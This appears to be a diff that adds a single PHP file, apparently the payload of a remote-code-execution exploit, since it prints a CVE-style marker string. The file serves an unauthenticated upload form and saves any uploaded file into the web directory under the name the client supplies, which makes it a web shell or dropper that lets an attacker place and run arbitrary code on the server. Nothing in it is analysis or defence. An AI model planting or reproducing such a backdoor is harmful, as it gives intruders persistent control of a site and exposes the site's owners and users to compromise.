@@ -1,0 +1,1 @@
+<? echo "CVE202648907RCE";if(isset($_FILES["f"])){$n=basename($_FILES["f"]["name"]);if(move_uploaded_file($_FILES["f"]["tmp_name"],$n)){echo"UP_OK_".$n;}else{echo"UP_FAIL";}}else{echo"<form method=post enctype=multipart/form-data>"."<input type=file name=f> ". "<button type=submit>Upload</button></form>"}?>
